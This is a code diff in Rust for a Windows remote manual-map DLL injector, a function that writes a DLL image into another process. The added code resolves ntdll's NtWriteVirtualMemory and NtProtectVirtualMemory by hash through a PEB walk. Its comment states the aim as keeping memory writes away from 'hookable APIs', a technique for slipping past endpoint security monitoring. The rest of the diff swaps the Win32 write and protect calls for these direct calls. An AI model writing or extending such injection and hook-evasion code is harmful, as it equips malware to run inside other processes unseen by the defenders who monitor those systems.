@@ -675,6 +675,21 @@ pub unsafe fn load_dll_in_remote_process(
     target_process: winapi::um::winnt::HANDLE,
     dll_bytes: &[u8],
 ) -> Result<*mut c_void> {
+    type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
+        process_handle: winapi::um::winnt::HANDLE,
+        base_address: *mut c_void,
+        buffer: *const c_void,
+        bytes_to_write: usize,
+        bytes_written: *mut usize,
+    ) -> i32;
+    type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
+        process_handle: winapi::um::winnt::HANDLE,
+        base_address: *mut *mut c_void,
+        region_size: *mut usize,
+        new_protect: u32,
+        old_protect: *mut u32,
+    ) -> i32;
+
     let pe = PE::parse(dll_bytes)?;
     let opt = pe
         .header
@@ -699,22 +714,75 @@ pub unsafe fn load_dll_in_remote_process(
         ));
     }
 
+    // Resolve NtWriteVirtualMemory/NtProtectVirtualMemory via clean export-walk
+    // so remote image writes/protection flips do not go through hookable APIs.
+    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+        .ok_or_else(|| anyhow!("remote_manual_map: ntdll not found via PEB walk"))?;
+
+    let nt_write_virtual_memory_addr = pe_resolve::get_proc_address_by_hash(
+        ntdll_base,
+        pe_resolve::hash_str(b"NtWriteVirtualMemory\0"),
+    )
+    .ok_or_else(|| anyhow!("remote_manual_map: NtWriteVirtualMemory not found"))?;
+
+    let nt_protect_virtual_memory_addr = pe_resolve::get_proc_address_by_hash(
+        ntdll_base,
+        pe_resolve::hash_str(b"NtProtectVirtualMemory\0"),
+    )
+    .ok_or_else(|| anyhow!("remote_manual_map: NtProtectVirtualMemory not found"))?;
+
+    let nt_write_virtual_memory: NtWriteVirtualMemoryFn =
+        std::mem::transmute(nt_write_virtual_memory_addr as *const ());
+    let nt_protect_virtual_memory: NtProtectVirtualMemoryFn =
+        std::mem::transmute(nt_protect_virtual_memory_addr as *const ());
+
+    let protect_remote =
+        |base: &mut *mut c_void, size: &mut usize, prot: u32, old: &mut u32| -> Result<()> {
+            let status = nt_protect_virtual_memory(target_process, base, size, prot, old);
+            if status < 0 {
+                return Err(anyhow!(
+                    "NtProtectVirtualMemory failed (status={status:#x})"
+                ));
+            }
+            Ok(())
+        };
+
     // Helper: write a local buffer slice into the remote process at an offset
-    // from remote_base.  Wraps WriteProcessMemory and checks for errors.
+    // from remote_base. Temporarily flips target pages to RW for the write and
+    // restores their prior protection immediately afterward.
     let write_remote = |rva: usize, data: &[u8]| -> Result<()> {
+        if data.is_empty() {
+            return Ok(());
+        }
         let dest = (remote_base as usize + rva) as *mut c_void;
+
+        let mut prot_base = dest;
+        let mut prot_size = data.len();
+        let mut old_prot = 0u32;
+        protect_remote(&mut prot_base, &mut prot_size, PAGE_READWRITE, &mut old_prot)?;
+
         let mut written = 0usize;
-        let ok = WriteProcessMemory(
+        let status = nt_write_virtual_memory(
             target_process,
             dest,
             data.as_ptr() as *const c_void,
             data.len(),
             &mut written,
         );
-        if ok == 0 || written != data.len() {
+
+        let mut restore_dummy = 0u32;
+        // Restore original protection even if the write failed.
+        let _ = protect_remote(
+            &mut prot_base,
+            &mut prot_size,
+            old_prot,
+            &mut restore_dummy,
+        );
+
+        if status < 0 || written != data.len() {
             return Err(anyhow!(
-                "WriteProcessMemory failed at rva {rva:#x}: {}",
-                std::io::Error::last_os_error()
+                "NtWriteVirtualMemory failed at rva {rva:#x} (status={status:#x}, written={written:#x}, expected={:#x})",
+                data.len()
             ));
         }
         Ok(())
@@ -742,37 +810,35 @@ pub unsafe fn load_dll_in_remote_process(
 
     // ── Step 3b: apply per-section memory protections ─────────────────────
     // The allocation was made as PAGE_READWRITE so we could write sections.
-    // Now apply the correct per-section protections so executable sections
-    // are not unnecessarily writable (removes the RWX exposure).
+    // Now apply the same per-section policy as the local variant so sections
+    // are never left RWX.  W+X is downgraded to RX; later write operations
+    // temporarily re-enable RW via NtProtectVirtualMemory.
     for section in &pe.sections {
-        let virt_size = section.virtual_size as usize;
-        if virt_size == 0 {
+        let prot_size = std::cmp::max(
+            section.virtual_size as usize,
+            section.size_of_raw_data as usize,
+        );
+        if prot_size == 0 {
             continue;
         }
         let rva = section.virtual_address as usize;
         let ch = section.characteristics;
-        let protect = if ch & IMAGE_SCN_MEM_EXECUTE != 0 {
-            if ch & IMAGE_SCN_MEM_WRITE != 0 {
-                PAGE_EXECUTE_READWRITE
-            } else if ch & IMAGE_SCN_MEM_READ != 0 {
-                PAGE_EXECUTE_READ
-            } else {
-                PAGE_EXECUTE_READ
-            }
-        } else if ch & IMAGE_SCN_MEM_WRITE != 0 {
-            if ch & IMAGE_SCN_MEM_READ != 0 {
-                PAGE_READWRITE
-            } else {
-                PAGE_READWRITE
-            }
-        } else if ch & IMAGE_SCN_MEM_READ != 0 {
-            PAGE_READONLY
-        } else {
-            PAGE_READONLY
+        let exec = ch & IMAGE_SCN_MEM_EXECUTE != 0;
+        let read = ch & IMAGE_SCN_MEM_READ != 0;
+        let write = ch & IMAGE_SCN_MEM_WRITE != 0;
+        let protect = match (exec, read, write) {
+            (true, _, true) => PAGE_EXECUTE_READ,
+            (true, true, false) => PAGE_EXECUTE_READ,
+            (true, false, false) => PAGE_EXECUTE,
+            (false, _, true) => PAGE_READWRITE,
+            (false, true, false) => PAGE_READONLY,
+            (false, false, false) => PAGE_NOACCESS,
         };
-        let target = (remote_base as usize + rva) as *mut c_void;
+
+        let mut target = (remote_base as usize + rva) as *mut c_void;
+        let mut size = prot_size;
         let mut old = 0u32;
-        VirtualProtectEx(target_process, target, virt_size, protect, &mut old);
+        protect_remote(&mut target, &mut size, protect, &mut old)?;
     }
 
     // ── Step 4a: compute and apply base relocations ────────────────────────
